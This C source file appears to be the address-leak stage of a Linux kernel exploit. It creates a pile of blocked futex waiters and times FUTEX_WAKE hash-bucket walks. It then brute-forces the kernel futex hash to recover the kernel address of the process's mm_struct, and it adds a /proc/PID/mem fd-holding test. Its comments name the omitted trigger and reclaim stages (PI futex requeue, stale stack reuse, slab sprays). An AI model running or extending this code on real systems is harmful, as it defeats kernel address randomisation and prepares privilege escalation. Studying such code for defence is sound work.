#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "kara_reclaim_hash.h"

/*
 * Leak-only kara probe.
 *
 * Deliberately absent:
 *   - FUTEX_CMP_REQUEUE_PI / FUTEX_LOCK_PI
 *   - stale stack-object reuse
 *   - mm_struct freeing or slab-cache shaping
 *   - AF_UNIX/pipe reclaim sprays
 *   - writes through kernel pointers
 *
 * It only times FUTEX_WAKE_PRIVATE hash-bucket walks in a disposable child,
 * then solves the recorded hash equalities in the parent.
 */

#define MAX_PILE_THREADS 2048u
#define MAX_SCAN_PAGES 32768u
#define MAX_REPEATS 64u
#define MAX_CANDIDATES 32u
#define MAX_SOLVER_THREADS 8u

#define DEFAULT_PILE_THREADS 512u
#define DEFAULT_SCAN_PAGES 16384u
#define DEFAULT_SCAN_REPEATS 12u
#define DEFAULT_FINAL_REPEATS 32u
#define DEFAULT_CANDIDATES 24u
#define DEFAULT_MIN_MATCHES 8u
#define DEFAULT_TIMEOUT_SEC 180u

#define FUTEX_HASH_MASK 0x3ffu
#define DIRECT_MAP_START 0xc0000000u
#define DIRECT_MAP_END 0xf0000000u
#define MM_SLAB_SIZE 0x2000u
#define MM_OBJECT_SIZE 0x1c0u
#define MM_OBJECTS_PER_SLAB 18u

struct probe_config {
    unsigned pile_threads;
    unsigned scan_pages;
    unsigned scan_repeats;
    unsigned final_repeats;
    unsigned candidate_count;
    unsigned min_matches;
    unsigned solver_threads;
    unsigned timeout_sec;
    int no_solve;
};

struct timed_candidate {
    uintptr_t address;
    uint64_t ns;
};

struct probe_shared {
    volatile unsigned started;
    volatile unsigned ready;
    unsigned made;
    unsigned candidate_count;
    int child_error;
    uintptr_t target;
    uint64_t baseline_ns;
    struct timed_candidate candidates[MAX_CANDIDATES];
};

struct solver_shared {
    uintptr_t target;
    uintptr_t candidates[MAX_CANDIDATES];
    unsigned candidate_count;
    unsigned min_matches;
    pthread_mutex_t best_lock;
    volatile unsigned best_score_hint;
    struct kara_best_score best;
};

struct solver_arg {
    struct solver_shared *shared;
    uint32_t first_slab;
    uint32_t end;
};

static struct probe_config g_cfg = {
    .pile_threads = DEFAULT_PILE_THREADS,
    .scan_pages = DEFAULT_SCAN_PAGES,
    .scan_repeats = DEFAULT_SCAN_REPEATS,
    .final_repeats = DEFAULT_FINAL_REPEATS,
    .candidate_count = DEFAULT_CANDIDATES,
    .min_matches = DEFAULT_MIN_MATCHES,
    .solver_threads = 4u,
    .timeout_sec = DEFAULT_TIMEOUT_SEC,
};

static struct probe_shared *g_shared;
static uint8_t *g_arena;
static size_t g_arena_size;
static uint8_t g_pile_page[KARA_PAGE_SIZE]
    __attribute__((aligned(KARA_PAGE_SIZE)));

static int futex_private(uint32_t *word, int op, uint32_t value)
{
    return (int)syscall(__NR_futex, word, op, value, NULL, NULL, 0);
}

static uint64_t now_ns(void)
{
    struct timespec ts;
    if (clock_gettime(CLOCK_MONOTONIC, &ts))
        return 0;
    return (uint64_t)ts.tv_sec * 1000000000ull + (uint64_t)ts.tv_nsec;
}

static int compare_u64(const void *left, const void *right)
{
    uint64_t a = *(const uint64_t *)left;
    uint64_t b = *(const uint64_t *)right;
    return (a > b) - (a < b);
}

static int compare_candidate_desc(const void *left, const void *right)
{
    const struct timed_candidate *a = left;
    const struct timed_candidate *b = right;
    return (a->ns < b->ns) - (a->ns > b->ns);
}

static uint64_t measure_wake(uint32_t *word, unsigned repeats)
{
    uint64_t samples[MAX_REPEATS];
    unsigned keep;

    for (unsigned i = 0; i < repeats; ++i) {
        uint64_t begin = now_ns();
        (void)futex_private(word, FUTEX_WAKE_PRIVATE, 0);
        samples[i] = now_ns() - begin;
    }
    qsort(samples, repeats, sizeof(samples[0]), compare_u64);
    keep = repeats / 4u;
    if (keep < 2u)
        keep = 2u;
    if (keep > repeats)
        keep = repeats;

    uint64_t sum = 0;
    for (unsigned i = 0; i < keep; ++i)
        sum += samples[i];
    return sum / keep;
}

static int pin_to_cpu0(void)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    return sched_setaffinity(0, sizeof(set), &set);
}

static void *pile_waiter(void *unused)
{
    (void)unused;
    __atomic_add_fetch(&g_shared->ready, 1u, __ATOMIC_RELEASE);
    (void)futex_private((uint32_t *)&g_pile_page[128],
                        FUTEX_WAIT_PRIVATE, 0);
    return NULL;
}

static void retain_top(struct timed_candidate *top, unsigned top_count,
                       uintptr_t address, uint64_t ns)
{
    if (ns <= top[top_count - 1u].ns)
        return;
    top[top_count - 1u].address = address;
    top[top_count - 1u].ns = ns;
    qsort(top, top_count, sizeof(top[0]), compare_candidate_desc);
}

static uint64_t measure_baseline(void)
{
    uint64_t baseline = UINT64_MAX;
    for (unsigned i = 1; i <= 16u; ++i) {
        size_t off = (size_t)i * KARA_PAGE_SIZE +
                     (((size_t)i * 8u) & (KARA_PAGE_SIZE - 1u));
        uint64_t ns = measure_wake((uint32_t *)(g_arena + off),
                                   g_cfg.final_repeats);
        if (ns < baseline)
            baseline = ns;
    }
    return baseline;
}

static void collision_child(void)
{
    pthread_attr_t attr;
    pthread_t tid;
    struct timed_candidate top[MAX_CANDIDATES];
    unsigned made = 0;

    memset(top, 0, sizeof(top));
    g_shared->started = 1u;
    g_shared->target = (uintptr_t)&g_pile_page[128];
    (void)pin_to_cpu0();

    if (pthread_attr_init(&attr)) {
        g_shared->child_error = 10;
        _exit(10);
    }
    (void)pthread_attr_setstacksize(&attr, 32768u);
    (void)pthread_attr_setguardsize(&attr, 0u);

    for (; made < g_cfg.pile_threads; ++made) {
        int err = pthread_create(&tid, &attr, pile_waiter, NULL);
        if (err)
            break;
        (void)pthread_detach(tid);
    }
    pthread_attr_destroy(&attr);
    g_shared->made = made;
    if (made < 128u) {
        g_shared->child_error = 11;
        _exit(11);
    }

    while (__atomic_load_n(&g_shared->ready, __ATOMIC_ACQUIRE) != made)
        sched_yield();
    usleep(300000);

    g_shared->baseline_ns = measure_baseline();
    for (unsigned i = 17u; i < g_cfg.scan_pages; ++i) {
        size_t off = (size_t)i * KARA_PAGE_SIZE +
                     (((size_t)i * 8u) & (KARA_PAGE_SIZE - 1u));
        uint64_t ns = measure_wake((uint32_t *)(g_arena + off),
                                   g_cfg.scan_repeats);
        retain_top(top, g_cfg.candidate_count,
                   (uintptr_t)(g_arena + off), ns);
    }

    /* Re-rank only the first-pass finalists using a larger sample. */
    for (unsigned i = 0; i < g_cfg.candidate_count; ++i) {
        top[i].ns = measure_wake((uint32_t *)top[i].address,
                                 g_cfg.final_repeats);
    }
    qsort(top, g_cfg.candidate_count, sizeof(top[0]),
          compare_candidate_desc);
    memcpy(g_shared->candidates, top,
           g_cfg.candidate_count * sizeof(top[0]));
    g_shared->candidate_count = g_cfg.candidate_count;
    _exit(0);
}

static void update_best(struct solver_shared *shared, uint32_t mm,
                        unsigned score)
{
    unsigned hint = __atomic_load_n(&shared->best_score_hint,
                                    __ATOMIC_RELAXED);
    if (!score || score < hint)
        return;
    pthread_mutex_lock(&shared->best_lock);
    kara_best_score_consider(&shared->best, mm, score);
    __atomic_store_n(&shared->best_score_hint, shared->best.score,
                     __ATOMIC_RELAXED);
    pthread_mutex_unlock(&shared->best_lock);
}

static void *solver_thread(void *opaque)
{
    struct solver_arg *arg = opaque;
    struct solver_shared *shared = arg->shared;

    for (uint32_t slab = arg->first_slab; slab < arg->end;
         slab += MM_SLAB_SIZE) {
        for (unsigned slot = 0; slot < MM_OBJECTS_PER_SLAB; ++slot) {
            uint32_t mm = slab + slot * MM_OBJECT_SIZE;
            if (mm >= arg->end)
                break;
            unsigned score = kara_score_candidates(
                shared->target, shared->candidates,
                shared->candidate_count, mm, FUTEX_HASH_MASK);
            update_best(shared, mm, score);
        }
    }
    return NULL;
}

static uint32_t solve_mm(unsigned *score_out, unsigned *ties_out)
{
    struct solver_shared shared;
    struct solver_arg args[MAX_SOLVER_THREADS];
    pthread_t tids[MAX_SOLVER_THREADS];
    unsigned threads = g_cfg.solver_threads;
    uint32_t total_slabs = (DIRECT_MAP_END - DIRECT_MAP_START) / MM_SLAB_SIZE;
    uint32_t slabs_per_thread = (total_slabs + threads - 1u) / threads;

    memset(&shared, 0, sizeof(shared));
    *score_out = 0;
    *ties_out = 0;
    if (pthread_mutex_init(&shared.best_lock, NULL))
        return 0;
    shared.target = g_shared->target;
    shared.candidate_count = g_shared->candidate_count;
    shared.min_matches = g_cfg.min_matches;
    for (unsigned i = 0; i < shared.candidate_count; ++i)
        shared.candidates[i] = g_shared->candidates[i].address;

    int complete = 1;
    for (unsigned i = 0; i < threads; ++i) {
        uint64_t first = (uint64_t)DIRECT_MAP_START +
                         (uint64_t)i * slabs_per_thread * MM_SLAB_SIZE;
        uint64_t end = first + (uint64_t)slabs_per_thread * MM_SLAB_SIZE;
        if (end > DIRECT_MAP_END)
            end = DIRECT_MAP_END;
        args[i].shared = &shared;
        args[i].first_slab = (uint32_t)first;
        args[i].end = (uint32_t)end;
        if (pthread_create(&tids[i], NULL, solver_thread, &args[i])) {
            fprintf(stderr, "[-] solver pthread_create failed at %u\n", i);
            complete = 0;
            threads = i;
            break;
        }
    }
    for (unsigned i = 0; i < threads; ++i)
        pthread_join(tids[i], NULL);

    struct kara_best_score best = shared.best;
    pthread_mutex_destroy(&shared.best_lock);
    *score_out = best.score;
    *ties_out = best.ties;
    if (!complete)
        return 0;
    uint32_t found = kara_best_score_unique(&best, shared.min_matches);
    if (!found && best.value)
        fprintf(stderr, "[solve] best=%08x score=%u/%u ties=%u\n",
                best.value, best.score, shared.candidate_count, best.ties);
    return found;
}

static unsigned parse_unsigned(const char *name, const char *text,
                               unsigned minimum, unsigned maximum)
{
    char *end = NULL;
    errno = 0;
    unsigned long value = strtoul(text, &end, 0);
    if (errno || !text[0] || !end || *end || value < minimum ||
        value > maximum) {
        fprintf(stderr, "invalid %s: %s (range %u..%u)\n",
                name, text, minimum, maximum);
        exit(64);
    }
    return (unsigned)value;
}

static void usage(const char *program)
{
    fprintf(stderr,
            "usage: %s [options]\n"
            "  --pile N              blocked FUTEX_WAIT threads (default %u)\n"
            "  --scan-pages N        candidate pages (default %u)\n"
            "  --scan-repeats N      first-pass samples (default %u)\n"
            "  --final-repeats N     finalist samples (default %u)\n"
            "  --candidates N        finalists retained (default %u)\n"
            "  --min-matches N       solver confidence gate (default %u)\n"
            "  --solver-threads N    brute-force workers (default 4)\n"
            "  --timeout N           child timeout seconds (default %u)\n"
            "  --no-solve            timing pass only\n"
            "  --proc-mem-test       hold one child mm via /proc/PID/mem\n"
            "  --self-test           hash/solver test only\n",
            program, DEFAULT_PILE_THREADS, DEFAULT_SCAN_PAGES,
            DEFAULT_SCAN_REPEATS, DEFAULT_FINAL_REPEATS,
            DEFAULT_CANDIDATES, DEFAULT_MIN_MATCHES,
            DEFAULT_TIMEOUT_SEC);
}

static int proc_mem_test(void)
{
    pid_t child = fork();
    if (child < 0) {
        perror("proc-mem fork");
        return 1;
    }
    if (child == 0) {
        for (;;)
            pause();
    }

    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/mem", child);
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    int saved_errno = errno;
    kill(child, SIGKILL);
    waitpid(child, NULL, 0);
    if (fd < 0) {
        fprintf(stderr, "proc-mem hold: FAIL open(%s) errno=%d (%s)\n",
                path, saved_errno, strerror(saved_errno));
        return 1;
    }
    if (fcntl(fd, F_GETFD) < 0) {
        perror("proc-mem held fd");
        close(fd);
        return 1;
    }
    close(fd);
    puts("proc-mem hold: PASS after child exit; NO_TRIGGER");
    return 0;
}

static int self_test(void)
{
    if (kara_futex_hash(0x12345000u, 0x001001c0u,
                        FUTEX_HASH_MASK) != 0x51u ||
        kara_futex_hash(0x7e008088u, 0xdeadc1c0u,
                        FUTEX_HASH_MASK) != 0x384u ||
        kara_futex_hash(0xb6f01004u, 0xc47a91c0u,
                        FUTEX_HASH_MASK) != 0x384u) {
        fprintf(stderr, "[-] jhash vector mismatch\n");
        return 1;
    }
    puts("kara_reclaim_probe self-test: PASS");
    return 0;
}

static int parse_args(int argc, char **argv)
{
    for (int i = 1; i < argc; ++i) {
        if (!strcmp(argv[i], "--pile") && i + 1 < argc)
            g_cfg.pile_threads = parse_unsigned("pile", argv[++i], 128u,
                                                MAX_PILE_THREADS);
        else if (!strcmp(argv[i], "--scan-pages") && i + 1 < argc)
            g_cfg.scan_pages = parse_unsigned("scan-pages", argv[++i], 256u,
                                              MAX_SCAN_PAGES);
        else if (!strcmp(argv[i], "--scan-repeats") && i + 1 < argc)
            g_cfg.scan_repeats = parse_unsigned("scan-repeats", argv[++i],
                                                4u, MAX_REPEATS);
        else if (!strcmp(argv[i], "--final-repeats") && i + 1 < argc)
            g_cfg.final_repeats = parse_unsigned("final-repeats", argv[++i],
                                                 4u, MAX_REPEATS);
        else if (!strcmp(argv[i], "--candidates") && i + 1 < argc)
            g_cfg.candidate_count = parse_unsigned("candidates", argv[++i],
                                                   8u, MAX_CANDIDATES);
        else if (!strcmp(argv[i], "--min-matches") && i + 1 < argc)
            g_cfg.min_matches = parse_unsigned("min-matches", argv[++i],
                                               4u, MAX_CANDIDATES);
        else if (!strcmp(argv[i], "--solver-threads") && i + 1 < argc)
            g_cfg.solver_threads = parse_unsigned("solver-threads", argv[++i],
                                                  1u, MAX_SOLVER_THREADS);
        else if (!strcmp(argv[i], "--timeout") && i + 1 < argc)
            g_cfg.timeout_sec = parse_unsigned("timeout", argv[++i], 10u,
                                               600u);
        else if (!strcmp(argv[i], "--no-solve"))
            g_cfg.no_solve = 1;
        else if (!strcmp(argv[i], "--self-test"))
            return self_test() ? -1 : 1;
        else if (!strcmp(argv[i], "--proc-mem-test"))
            return proc_mem_test() ? -1 : 1;
        else if (!strcmp(argv[i], "--help")) {
            usage(argv[0]);
            return 1;
        } else {
            usage(argv[0]);
            return -1;
        }
    }
    if (g_cfg.min_matches > g_cfg.candidate_count) {
        fprintf(stderr, "min-matches cannot exceed candidates\n");
        return -1;
    }
    return 0;
}

static int wait_for_child(pid_t child)
{
    uint64_t deadline = now_ns() + (uint64_t)g_cfg.timeout_sec * 1000000000ull;
    int status = 0;

    for (;;) {
        pid_t result = waitpid(child, &status, WNOHANG);
        if (result == child)
            break;
        if (result < 0) {
            perror("waitpid");
            return 0;
        }
        if (now_ns() >= deadline) {
            fprintf(stderr, "[-] collision child timed out; terminating it\n");
            kill(child, SIGKILL);
            waitpid(child, &status, 0);
            return 0;
        }
        usleep(100000);
    }
    if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
        fprintf(stderr, "[-] collision child failed status=%d child_error=%d\n",
                status, g_shared->child_error);
        return 0;
    }
    return 1;
}

int main(int argc, char **argv)
{
    int parsed = parse_args(argc, argv);
    if (parsed)
        return parsed < 0 ? 64 : 0;

    fprintf(stderr,
            "[mode] leak-only; NO PI futex, reclaim, kernel write, or trigger\n"
            "[cfg] pile=%u scan_pages=%u repeats=%u/%u candidates=%u "
            "min_matches=%u solver_threads=%u\n",
            g_cfg.pile_threads, g_cfg.scan_pages, g_cfg.scan_repeats,
            g_cfg.final_repeats, g_cfg.candidate_count,
            g_cfg.min_matches, g_cfg.solver_threads);

    g_shared = mmap(NULL, KARA_PAGE_SIZE, PROT_READ | PROT_WRITE,
                    MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    g_arena_size = ((size_t)g_cfg.scan_pages + 1u) * KARA_PAGE_SIZE;
    g_arena = mmap(NULL, g_arena_size, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE, -1, 0);
    if (g_shared == MAP_FAILED || g_arena == MAP_FAILED) {
        perror("mmap");
        return 2;
    }
    memset(g_shared, 0, KARA_PAGE_SIZE);

    pid_t child = fork();
    if (child == 0)
        collision_child();
    if (child < 0) {
        perror("fork");
        return 2;
    }
    if (!wait_for_child(child))
        return 2;

    fprintf(stderr, "[timing] child made %u/%u waiters; baseline=%llu ns\n",
            g_shared->made, g_cfg.pile_threads,
            (unsigned long long)g_shared->baseline_ns);
    for (unsigned i = 0; i < g_shared->candidate_count; ++i) {
        double ratio = g_shared->baseline_ns
                           ? (double)g_shared->candidates[i].ns /
                                 (double)g_shared->baseline_ns
                           : 0.0;
        fprintf(stderr, "[timing] %02u addr=%08lx ns=%llu ratio=%.1fx\n",
                i, (unsigned long)g_shared->candidates[i].address,
                (unsigned long long)g_shared->candidates[i].ns, ratio);
    }
    if (g_cfg.no_solve) {
        puts("RESULT timing-only PASS; NO_TRIGGER");
        return 0;
    }

    unsigned score = 0;
    unsigned ties = 0;
    uint64_t solve_begin = now_ns();
    uint32_t mm = solve_mm(&score, &ties);
    uint64_t solve_ms = (now_ns() - solve_begin) / 1000000ull;
    if (!mm) {
        fprintf(stderr,
                "[-] no allocator-valid mm_struct met confidence gate "
                "(best score %u/%u, %llu ms)\n",
                score, g_shared->candidate_count,
                (unsigned long long)solve_ms);
        puts("RESULT leak-only INCONCLUSIVE; NO_TRIGGER");
        return 3;
    }

    uint32_t slab = mm & ~(MM_SLAB_SIZE - 1u);
    uint32_t slot = (mm - slab) / MM_OBJECT_SIZE;
    fprintf(stderr,
            "[solve] mm=%08x slab=%08x slot=%u score=%u/%u ties=%u (%llu ms)\n",
            mm, slab, slot, score, g_shared->candidate_count, ties,
            (unsigned long long)solve_ms);
    puts("RESULT leak-only PASS; mm_struct validated; NO_TRIGGER");
    return 0;
}
